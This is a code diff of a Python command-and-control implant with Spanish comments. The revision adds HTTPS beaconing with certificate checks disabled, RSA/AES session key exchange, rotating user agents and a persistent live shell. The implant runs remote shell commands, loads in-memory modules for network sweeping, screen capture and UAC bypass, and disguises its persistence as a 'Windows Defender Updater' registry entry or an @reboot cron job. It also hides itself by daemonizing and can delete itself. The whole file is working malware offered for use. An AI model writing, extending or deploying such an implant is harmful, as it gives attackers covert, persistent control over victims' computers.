@@ -1,13 +1,10 @@
 """
 ╔══════════════════════════════════════════════════════════════╗
-║        C2 AGENT v2 - ARQUITECTURA HTTP & FILELESS            ║
+║        C2 AGENT v2 - ARQUITECTURA HTTP/HTTPS FILELESS        ║
 ╚══════════════════════════════════════════════════════════════╝
-
-Características V2:
-- Beacons vía HTTP GET (Poll) y HTTP POST (Responses).
-- Jittering (retrasos aleatorios de sleep).
-- Carga de módulos en memoria (Fileless / Reflective Execution).
-- Malleable C2 HTTP Profiles.
+- Encriptación Dinámica RSA + AES por sesión (Nivel Empresa)
+- Evasión SSL/TLS (Tráfico HTTPS)
+- Perfiles Malleable C2 + Jittering Aleatorizado
 """
 
 import urllib.request
@@ -21,9 +18,12 @@ import random
 import time
 import threading
 import subprocess
+import ssl
+import queue
 
 try:
-    from Crypto.Cipher import AES
+    from Crypto.Cipher import AES, PKCS1_OAEP
+    from Crypto.PublicKey import RSA
     from Crypto.Random import get_random_bytes
     from Crypto.Util.Padding import pad, unpad
     import hashlib
@@ -34,13 +34,22 @@ except ImportError:
 # =========================================================
 # CONFIGURACIÓN DEL IMPLANTE
 # =========================================================
-C2_URL = "http://127.0.0.1:4444"
-AES_KEY = b'C2ProjectEduKey2024!SecureKey32b'
-BEACON_INTERVAL = 5   # Segundos base entre cada check-in
-JITTER = 0.3          # 30% de variación aleatoria de tiempo
+C2_URL = "https://127.0.0.1:5000"
+BEACON_INTERVAL = 5   
+JITTER = 0.3          
+
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
+    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0)',
+    'Spotify/1.1.56.595 (Windows NT 10.0; Win64; x64)'
+]
+
+# Permitir conexiones HTTPS Autofirmadas
+ssl_context = ssl._create_unverified_context()
 
 class AESCipher:
-    def __init__(self, key: bytes = AES_KEY):
+    def __init__(self, key: bytes):
         if AES_AVAILABLE:
             self.key = hashlib.sha256(key).digest() if len(key) != 32 else key
             
@@ -59,18 +68,43 @@ class AESCipher:
 
 class AgentV2:
     def __init__(self):
-        self.aes = AESCipher()
         self.agent_id = self._generate_id()
         self.cwd = os.getcwd()
         self.running = True
         self.beacon_interval = BEACON_INTERVAL
         self.jitter = JITTER
         
-        # Módulos inyectados en memoria
         self.injected_modules = {}
+        # Generar llave AES única efímera
+        self.aes_key = get_random_bytes(32) if AES_AVAILABLE else b'FallbackInsecureKey____'
+        self.aes = AESCipher(self.aes_key)
+
+        # === Módulo 1: Persistent PTY Asíncrona ===
+        self.pty_queue = queue.Queue()
+        shell_exe = "cmd.exe" if platform.system() == "Windows" else "/bin/bash"
+        self.pty_process = subprocess.Popen(
+            [shell_exe],
+            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT
+        )
+        self.pty_thread = threading.Thread(target=self._pty_reader, daemon=True)
+        self.pty_thread.start()
+
+    def _pty_reader(self):
+        # Lee byte a byte del subproceso congelado sin bloquear el pipeline
+        while self.running:
+            try:
+                byte = self.pty_process.stdout.read(1)
+                if not byte: break
+                codec = 'cp850' if platform.system() == 'Windows' else 'utf-8'
+                self.pty_queue.put(byte.decode(codec, errors='replace'))
+            except:
+                break
 
     def _generate_id(self):
         return base64.b64encode(os.urandom(6)).decode('utf-8')
+        
+    def _get_ua(self):
+        return random.choice(USER_AGENTS)
 
     def build_sysinfo(self):
         return {
@@ -92,53 +126,88 @@ class AgentV2:
         except Exception as e:
             return {'error': str(e)}
 
+    def handshake(self):
+        """Negocia la clave AES efímera con el servidor usando la PKI (Llave Pública)"""
+        try:
+            # 1. Obtener la llave Pública
+            req = urllib.request.Request(f"{C2_URL}/api/v2/get_cert", headers={'User-Agent': self._get_ua()})
+            with urllib.request.urlopen(req, context=ssl_context, timeout=10) as r:
+                data = json.loads(r.read())
+            pub_key_str = data.get('public_key')
+            
+            if pub_key_str and pub_key_str != "NO_RSA":
+                if not AES_AVAILABLE:
+                    print("[-] CRITICAL: PyCryptodome no está instalado. No se puede arrancar el túnel C2.")
+                    sys.exit(1)
+                
+                server_pub_key = RSA.import_key(pub_key_str)
+                rsa_cipher = PKCS1_OAEP.new(server_pub_key)
+                encrypted_aes = rsa_cipher.encrypt(self.aes_key)
+                payload = {
+                    'id': self.agent_id,
+                    'encrypted_aes': base64.b64encode(encrypted_aes).decode('utf-8'),
+                    'info': self.build_sysinfo()
+                }
+            else:
+                return
+            
+            # 2. Enviar la llave cifrada de vuelta (esto registra al agente en el C2)
+            post_data = json.dumps(payload).encode('utf-8')
+            req2 = urllib.request.Request(f"{C2_URL}/api/v2/handshake", data=post_data, headers={
+                'Content-Type': 'application/json', 'User-Agent': self._get_ua()
+            })
+            urllib.request.urlopen(req2, context=ssl_context, timeout=10)
+        except Exception as e:
+            print(f"[-] FATAL ERROR IN HANDSHAKE: {str(e)}")
+            import traceback
+            traceback.print_exc()
+
     def check_in(self):
-        """Malleable GET: Emula telemetría web. Mete la ID en la Cookie para evadir"""
         safe_id = urllib.parse.quote(self.agent_id)
-        # Disfrazamos la URL pareciendo un ping inofensivo a una API
         url = f"{C2_URL}/api/v2/telemetry"
-        
-        # Inyectamos el ID disfrazado en la cabecera Cookie
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Cookie': f'session_id={safe_id}'
-        }
-        
+        headers = { 'User-Agent': self._get_ua(), 'Cookie': f'session_id={safe_id}' }
         try:
             req = urllib.request.Request(url, headers=headers)
-            with urllib.request.urlopen(req, timeout=10) as response:
+            with urllib.request.urlopen(req, context=ssl_context, timeout=10) as response:
                 content = response.read()
+                
+                # Flushing Asíncrono: Si el PTY está escupiendo texto (ej. scan Nmap)
+                # se envía de vuelta inmediatamente en este Check-In.
+                out_buffer = ""
+                while True:
+                    try: out_buffer += self.pty_queue.get_nowait()
+                    except queue.Empty: break
+                
+                if out_buffer:
+                    import uuid
+                    self.send_response(f"pty_{uuid.uuid4().hex[:8]}", {'output': out_buffer})
+                    
                 if content:
                     payload = self.decode_payload(content)
-                    if 'command' in payload:
+                    if payload and 'command' in payload:
                         self.process_command(payload)
         except Exception:
             pass
 
     def send_response(self, task_id: str, data: dict):
-        """Malleable POST: Envía respuestas ocultas en campos de formulario o cookies falsas"""
         url = f"{C2_URL}/api/v2/update"
         data['id'] = self.agent_id
         data['task_id'] = task_id
         
         payload_str = self.encode_payload(data)
-        # Armamos un Payload Malleable que parece información basura
         post_data = urllib.parse.urlencode({'__VIEWSTATE': payload_str}).encode('utf-8')
-        
         headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'User-Agent': self._get_ua(),
             'Content-Type': 'application/x-www-form-urlencoded',
             'Cookie': f'session_id={urllib.parse.quote(self.agent_id)}'
         }
-        
         try:
             req = urllib.request.Request(url, data=post_data, headers=headers)
-            urllib.request.urlopen(req, timeout=10)
+            urllib.request.urlopen(req, context=ssl_context, timeout=10)
         except Exception:
             pass
 
     def evaluate_in_memory(self, code_str: str, module_name: str):
-        """Inyecta y compila código crudo dentro del contexto de memoria del Agente"""
         try:
             compiled_code = compile(code_str, '<string>', 'exec')
             module_globals = {}
@@ -153,7 +222,6 @@ class AgentV2:
         task_id = payload.get('task_id', '0000')
         args = payload.get('args', '')
         
-        # Evaluar carga fileless
         if 'fileless_script' in payload:
             script_content = payload['fileless_script']
             mod_name = args 
@@ -164,18 +232,24 @@ class AgentV2:
                 self.send_response(task_id, {'error': f'[-] Error inyectando módulo: {res}'})
             return
 
-        # Comandos Nativos
         if cmd_str == 'register':
-            self.send_response(task_id, {'info': self.build_sysinfo()})
-            
+            pass # Ya manejado por handshake
         elif cmd_str == 'shell':
             try:
-                res = subprocess.run(args, shell=True, capture_output=True, text=True, timeout=30)
-                out = res.stdout + res.stderr
-                self.send_response(task_id, {'output': out if out else '[Command executed]'})
+                # Escribir el comando a la sesión viva y flushear
+                self.pty_process.stdin.write((args + "\n").encode('utf-8'))
+                self.pty_process.stdin.flush()
+                
+                # Esperar 0.5s para captura inmediata
+                time.sleep(0.5)
+                out_buffer = ""
+                while True:
+                    try: out_buffer += self.pty_queue.get_nowait()
+                    except queue.Empty: break
+                
+                self.send_response(task_id, {'output': out_buffer if out_buffer else '...'})
             except Exception as e:
                 self.send_response(task_id, {'error': str(e)})
-                
         elif cmd_str == 'sweep':
             if 'network_sweeper' in self.injected_modules:
                 try:
@@ -186,8 +260,7 @@ class AgentV2:
                 except Exception as e:
                     self.send_response(task_id, {'error': str(e)})
             else:
-                self.send_response(task_id, {'error': 'El módulo network_sweeper no está inyectado en RAM. Inyéctalo primero.'})
-                
+                self.send_response(task_id, {'error': 'Módulo network_sweeper no está inyectado.'})
         elif cmd_str == 'watch':
             if 'stream_capture' in self.injected_modules:
                 try:
@@ -201,8 +274,7 @@ class AgentV2:
                 except Exception as e:
                     self.send_response(task_id, {'error': str(e)})
             else:
-                self.send_response(task_id, {'error': 'El módulo stream_capture no está inyectado en RAM. Inyéctalo primero.'})
-
+                self.send_response(task_id, {'error': 'Módulo stream_capture no inyectado.'})
         elif cmd_str == 'elevate':
             if 'uac_bypass' in self.injected_modules:
                 try:
@@ -213,8 +285,7 @@ class AgentV2:
                 except Exception as e:
                     self.send_response(task_id, {'error': str(e)})
             else:
-                self.send_response(task_id, {'error': 'El módulo uac_bypass no está inyectado en RAM. Inyéctalo primero.'})
-                
+                self.send_response(task_id, {'error': 'Módulo uac_bypass no inyectado.'})
         elif cmd_str == 'persist':
             target_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
             if platform.system() == 'Windows':
@@ -224,32 +295,27 @@ class AgentV2:
                     key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                     winreg.SetValueEx(key, "Windows Defender Updater", 0, winreg.REG_SZ, f'"{target_exe}"')
                     winreg.CloseKey(key)
-                    self.send_response(task_id, {'output': '[+] Clave de registro creada exitosamente. (Persistencia Windows)'})
+                    self.send_response(task_id, {'output': '[+] Clave de registro creada. (Persistencia Windows)'})
                 except Exception as e:
-                    self.send_response(task_id, {'error': f'[-] No se pudo establecer persistencia: {str(e)}'})
+                    self.send_response(task_id, {'error': str(e)})
             else:
                 try:
                     cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot {target_exe}") | crontab -'
                     os.system(cron_cmd)
-                    self.send_response(task_id, {'output': '[+] Cronjob inyectado existosamente. (Persistencia Linux @reboot)'})
+                    self.send_response(task_id, {'output': '[+] Cronjob inyectado.'})
                 except Exception as e:
-                    self.send_response(task_id, {'error': f'[-] Error configurando el Cronjob: {e}'})
-                
+                    self.send_response(task_id, {'error': str(e)})
         elif cmd_str == 'sleep':
             try:
                 parts = args.split()
-                if len(parts) >= 1:
-                    self.beacon_interval = float(parts[0])
-                if len(parts) >= 2:
-                    self.jitter = float(parts[1])
-                self.send_response(task_id, {'output': f'[+] Tiempos actualizados: Sleep={self.beacon_interval}s, Jitter={self.jitter}'})
+                if len(parts) >= 1: self.beacon_interval = float(parts[0])
+                if len(parts) >= 2: self.jitter = float(parts[1])
+                self.send_response(task_id, {'output': f'[+] Control de Sleep: {self.beacon_interval}s, Jitter: {self.jitter}'})
             except Exception as e:
-                self.send_response(task_id, {'error': f'[-] Error ajustando sleep: {e}'})
-                
+                self.send_response(task_id, {'error': str(e)})
         elif cmd_str == 'kill':
-            self.send_response(task_id, {'output': '[+] Ejecutando orden de auto-destrucción...'})
+            self.send_response(task_id, {'output': '[+] Ejecutando auto-destrucción...'})
             self.running = False
-            # Limpiar persistencia si existe (Windows)
             if platform.system() == 'Windows':
                 try:
                     import winreg
@@ -259,24 +325,20 @@ class AgentV2:
                     winreg.CloseKey(key)
                 except Exception:
                     pass
-                    
-            # Si corre como script, nos borramos a nosotros mismos
             script_path = os.path.abspath(__file__)
             if not getattr(sys, 'frozen', False):
                 try:
-                    # Cmd en background para borrar el archivo actual tras 2 segundos
                     os.system(f'start /b cmd /c ping 127.0.0.1 -n 3 > nul & del "{script_path}"')
                 except:
                     pass
             sys.exit(0)
-                
         else:
-            self.send_response(task_id, {'error': 'Comando desconocido por agent_v2'})
+            self.send_response(task_id, {'error': 'Comando desconocido'})
 
     def run(self):
-        # Registro inicial
-        self.send_response('register', {'info': self.build_sysinfo()})
-        print(f"[*] Agent {self.agent_id} initialized with Beacons.")
+        # Asegurar comunicación de claves RSA
+        self.handshake()
+        print(f"[*] Agent {self.agent_id} secured with dynamic AES and initialized.")
         
         while self.running:
             self.check_in()
@@ -284,18 +346,13 @@ class AgentV2:
             time.sleep(sleep_time)
 
 if __name__ == '__main__':
-    # Evasión Rootkit: Daemonizar el proceso en Linux ocultándolo del usuario
     if platform.system() != 'Windows':
         import os
         try:
-            if os.fork() > 0:
-                sys.exit(0) # El proceso padre muere, el hijo queda residente en RAM
+            if os.fork() > 0: sys.exit(0)
         except OSError:
             pass
-        
-        # Eliminar cualquier output por pantalla redirigiendo a /dev/null
         sys.stdout = open(os.devnull, 'w')
         sys.stderr = open(os.devnull, 'w')
-        
     agent = AgentV2()
     agent.run()
